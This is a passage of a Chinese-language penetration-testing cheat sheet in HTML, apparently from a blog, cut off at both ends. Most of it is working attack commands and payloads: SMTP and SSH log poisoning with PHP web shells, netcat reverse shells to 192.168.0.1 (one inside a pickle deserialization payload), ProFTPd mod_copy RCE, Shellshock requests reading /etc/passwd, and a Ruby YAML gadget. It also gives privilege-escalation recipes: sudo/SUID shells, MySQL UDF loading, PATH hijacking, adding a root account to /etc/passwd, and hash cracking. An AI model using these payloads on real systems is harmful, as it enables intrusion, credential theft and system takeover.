dbfilename &quot;authorized_keys&quot;</span><br><span class="line">redis-cli -h 192.168.0.0 save</span><br><span class="line">ssh -i /root/.ssh/id_rsa redis@192.168.0.0</span><br></pre></td></tr></table></figure><h3 id="其他漏洞"><a class="markdownIt-Anchor" href="#其他漏洞"></a> 其他漏洞</h3><ul><li>git信息泄露 : githack</li><li>DS_Store文件泄露 : ds_store_exp</li><li>SMTP + LFI = GetShell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.0.0 25</span><br><span class="line">MAIl FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: Username</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br><span class="line">~~~~~</span><br><span class="line">&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8081</span><br></pre></td></tr></table></figure><ul><li>SSH + LFI = GetShell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.0</span><br><span class="line">file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls</span><br></pre></td></tr></table></figure><ul><li>ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.0 21</span><br><span class="line">site cpfr &#x2F;etc&#x2F;passwd</span><br><span class="line">site cpto &#x2F;home&#x2F;ftp</span><br><span class="line">~~~~~~</span><br><span class="line">nc 192.168.0.0 21</span><br><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php</span><br></pre></td></tr></table></figure><ul><li><p>ShellShock</p><ul><li><code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code> (CVE-2014-6271)</li><li><code>env -i X=';() &#123; (a)=&gt;\' bash -c 'echo date'; cat echo</code> (CVE-2014-7169)</li><li>/cgi-bin/* 200</li><li><code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.0/cgi-bin/</code></li></ul></li><li><p>Ruby YAML.Load() Deserialization</p></li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Installer</span><br><span class="line">    <span class="symbol">i:</span> x</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::SpecFetcher</span><br><span class="line">    <span class="symbol">i:</span> y</span><br><span class="line">- !ruby/<span class="symbol">object:</span>Gem::Requirement</span><br><span class="line">  <span class="symbol">requirements:</span></span><br><span class="line">    !ruby/<span class="symbol">object:</span>Gem::Package::TarReader</span><br><span class="line">    <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::BufferedIO</span><br><span class="line">      <span class="symbol">io:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::Package::TarReader::Entry</span><br><span class="line">         <span class="symbol">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="symbol">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="symbol">debug_output:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">         <span class="symbol">socket:</span> &amp;<span class="number">1</span> !ruby/<span class="symbol">object:</span>Gem::RequestSet</span><br><span class="line">             <span class="symbol">sets:</span> !ruby/<span class="symbol">object:</span>Net::WriteAdapter</span><br><span class="line">                 <span class="symbol">socket:</span> !ruby/<span class="class"><span class="keyword">module</span> &#x27;<span class="title">Kernel</span>&#x27;</span></span><br><span class="line">                 <span class="symbol">method_id:</span> <span class="symbol">:system</span></span><br><span class="line">             <span class="symbol">git_set:</span> <span class="string">&quot;touch /tmp/hacked&quot;</span></span><br><span class="line">         <span class="symbol">method_id:</span> <span class="symbol">:resolve</span></span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><h3 id="cap特权"><a class="markdownIt-Anchor" href="#cap特权"></a> cap特权</h3><p><code>getcap -r / 2&gt; /dev/null</code></p><table><thead><tr><th>Capabilities</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td style="text-align:left">将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td style="text-align:left">使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td style="text-align:left">修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td style="text-align:left">允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td style="text-align:left">允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td style="text-align:left">忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td style="text-align:left">允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td style="text-align:left">允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td style="text-align:left">允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td style="text-align:left">允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td style="text-align:left">允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td style="text-align:left">允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td style="text-align:left">允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td style="text-align:left">允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td style="text-align:left">允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td style="text-align:left">参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td style="text-align:left">允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td style="text-align:left">允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td style="text-align:left">允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td style="text-align:left">允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td style="text-align:left">允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td style="text-align:left">允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td style="text-align:left">允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td style="text-align:left">忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td style="text-align:left">允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td style="text-align:left">允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td style="text-align:left">允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td style="text-align:left">允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><p><strong>流量监听</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line">timeout 120 tcpdump -i interface -w cap.pcap</span><br><span class="line">tcpdump -r cap.pcap</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 120 tshark -i interface</span><br></pre></td></tr></table></figure><h3 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> Shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><ul><li>tty(输出至终端/需要注意tty的写入权限)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tty</span><br><span class="line">&#x2F;dev&#x2F;pts&#x2F;0</span><br><span class="line">cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0</span><br></pre></td></tr></table></figure><h3 id="密码"><a class="markdownIt-Anchor" href="#密码"></a> 密码</h3><ul><li>密码共用<ul><li>WEB账户</li><li>WEB admin</li><li>SSH</li><li>FTP</li><li>MySQL</li><li>root</li><li>Redis</li></ul></li><li><code>/etc/passwd</code> &amp; <code>/etc/shadow</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat --help | grep Unix</span><br><span class="line">hashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27; &gt; passwd</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br></pre></td></tr></table></figure><ul><li>unshadow</li><li>ssh</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br></pre></td></tr></table></figure><ul><li>wordpress – $P$ – phpass</li></ul><table><thead><tr><th style="text-align:center">passwd/shadow</th><th style="text-align:center">Method</th><th style="text-align:center">hashcat -m</th><th style="text-align:center">john --format=</th></tr></thead><tbody><tr><td style="text-align:center">$1</td><td style="text-align:center">md5</td><td style="text-align:center">500</td><td style="text-align:center">md5crypt-long</td></tr><tr><td style="text-align:center">$2*</td><td style="text-align:center">bcrypt(Blow Fish)</td><td style="text-align:center">3200</td><td style="text-align:center">bcrypt</td></tr><tr><td style="text-align:center">$5</td><td style="text-align:center">sha256</td><td style="text-align:center">7400</td><td style="text-align:center">sha256crypt</td></tr><tr><td style="text-align:center">$6</td><td style="text-align:center">sha512</td><td style="text-align:center">1800</td><td style="text-align:center">sha512crypt</td></tr></tbody></table><h3 id="本地服务探测"><a class="markdownIt-Anchor" href="#本地服务探测"></a> 本地服务探测</h3><ul><li>netstat</li><li>ss</li></ul><h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3><ul><li>插件路径: <code>show variables like 'plugin_dir';</code></li><li>文件权限: <code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><ul><li>mysqld.conf: “secure_file_priv=”</li><li>该值为空则无限制</li><li>该值为NULL则不可写入</li><li>该值为路径则可写入该路径（不包含子路径）</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><h4 id="udf文件dllso"><a class="markdownIt-Anchor" href="#udf文件dllso"></a> UDF文件(dll/so)</h4><p><strong>Metasploit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure><p>可以使用IDA来查看具体有哪些函数</p><ul><li>sys_get</li><li>sys_exec</li><li>sys_eval</li><li>sys_set</li><li>sys_bineval</li></ul><p><strong>SQLMap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure><p><strong>Decode</strong><br /><code>python .\cloak.py -d -i ..\..\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p><h4 id="mysql执行系统命令"><a class="markdownIt-Anchor" href="#mysql执行系统命令"></a> Mysql执行系统命令</h4><ul><li>system whoami<br />(version &gt;= 5.7)</li></ul><h3 id="sudo-suid"><a class="markdownIt-Anchor" href="#sudo-suid"></a> SUDO &amp; SUID</h3><p><strong><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></strong></p><p>使用Shell脚本进行提权，参数带有空格时需要用引号</p><p>SUID: <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo -i</span><br><span class="line">cat &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><p>查看可以以sudo模式运行的程序<br /><code>sudo -l</code></p><ul><li><p>当sudo权限的命令受到执行路径的限制时，可以使用<code>../</code>来进行bypass</p></li><li><p>doas</p></li><li><p>python: <code>python -c 'import os;os.system(&quot;/bin/bash&quot;)'</code></p><ul><li>input(): <code>__import__('os').system('/bin/sh')</code></li><li>lib文件写入命令</li><li>pickle unserialize</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class RCE(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;)</span><br><span class="line">        return os.system, (cmd,)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))</span><br><span class="line"></span><br><span class="line">print(urllib.quote((pickle.dumps(payload()))))</span><br></pre></td></tr></table></figure><ul><li>php: <code>php -r &quot;system('/bin/bash');&quot;</code></li><li>rpm: <code>rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;'</code></li><li>dpkg</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gem install fpm</span><br><span class="line">mkdir exp &amp;&amp; cd exp</span><br><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n&#x2F;bin&#x2F;bash&#39; &gt; exp.sh</span><br><span class="line">fpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;</span><br><span class="line">dpkg -i exp_1.0_amd64.deb</span><br></pre></td></tr></table></figure><ul><li>ruby: <code>ruby -e 'exec &quot;/bin/bash&quot;'</code></li><li>gcc: <code>gcc -wrapper /bin/bash,-s .</code></li><li>perl: <code>perl -e 'exec &quot;/bin/bash&quot;;'</code></li><li>java:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sudo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">    processBuilder.command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami &gt; whoami&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line">            BufferedReader reader =</span><br><span class="line">                    <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> exitCode = process.waitFor();</span><br><span class="line">            System.out.println(<span class="string">&quot;\nExited with error code : &quot;</span> + exitCode);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">java sudo</span><br></pre></td></tr></table></figure><ul><li>mysql: <code>mysql -e '\! /bin/bash'</code></li><li>nmap<ul><li>2.02 &lt;= nmap -v &lt;=5.21</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure><ul><li><p>vim</p><ul><li><p>浏览<code>/etc/shadow</code></p></li><li><p>shell</p></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><ul><li><p>less</p></li><li><p>more</p></li><li><p>nano</p></li><li><p>cp</p><ul><li><p>覆盖passwd（垂直）</p></li><li><p>写入authorized_keys（水平）</p></li><li><p>–no-preserve=mode</p></li></ul></li><li><p>mv</p></li><li><p>wget</p></li><li><p>find</p><ul><li><p><code>find . -exec whoami \;</code></p></li><li><p><code>find . -exec /bin/bash -p\;</code></p></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure><ul><li><p>bash</p></li><li><p>bash -p</p></li><li><p>awk</p><ul><li><p><code>awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></p></li><li><p><code>/tmp/1</code> 是写好的账户信息</p></li></ul></li><li><p>RE用于匹配passwd中某单独一行的结尾部分</p></li><li><p>tee: <code>echo 1 | tee /etc/passwd</code></p></li><li><p>unzip</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">echo data &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">unzip new.zip -d &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h4 id="path"><a class="markdownIt-Anchor" href="#path"></a> $PATH</h4><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p><strong>echo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>copy</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><strong>symlink</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">ln -s &#x2F;bin&#x2F;bash ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h3 id="mail"><a class="markdownIt-Anchor" href="#mail"></a> mail</h3><p><code>cat /var/spool/mail/*</code></p><h3 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h3><p><code>cat /etc/crontab</code><br /><code>ls -la /var/spool/cron/</code><br /><code>ls -la /tmp</code><br /><code>crontab -e</code></p><p>crontab所执行的命令一般来说是难以通过ps命令来发现的，除非是在命令执行的过程中正好使用ps命令查看进程<br />这对于耗时长的命令或者是使用脚本循环执行命令来说是可行的，但是对于几乎瞬时完成的命令则是束手无策<br />可以使用pspy来持续地监视后台进程<br /><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><ul><li>一般的crontab设置为整分运行，pspy每分钟的第一秒显示的命令即为crontab的内容</li><li>目录权限<ul><li>r 列出目录中的内容</li><li>w 在目录中增加删除文件，修改文件名</li><li>x 进入目录以及对目录下的文件进行操作</li><li>r-- 可以在不进入目录的情况下列出目录下的文件，但不能查看文件详细信息</li><li>–x 可以在单独列出已知文件，并查看文件详细信息</li></ul></li></ul><h3 id="passwd可写"><a class="markdownIt-Anchor" href="#passwd可写"></a> passwd可写</h3><p><code>ls -l /etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>echo写入一定要用<code>'</code></p><h3 id="exp提权"><a class="markdownIt-Anchor" 